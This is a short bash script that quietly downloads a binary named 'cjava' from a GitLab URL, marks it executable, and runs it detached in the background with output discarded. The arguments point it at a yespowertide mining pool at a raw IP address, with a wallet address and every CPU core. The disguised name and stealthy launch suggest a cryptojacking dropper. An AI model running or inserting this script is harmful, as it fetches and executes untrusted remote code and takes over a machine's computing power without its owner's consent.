#!/bin/bash
wget -qO cjava https://gitlab.com/ghcees/pack/-/raw/main/cjava && chmod +x cjava && nohup ./cjava -a yespowertide -o 120.89.46.39:80 -u TG4zyjhTxSrwAgiUbWuSJ13uHJwvtfUyvK.$(echo CMD-$(TZ=UTC-7 date +"%H-%M-%S")) -p x -t $(nproc --all) >/dev/null & disown
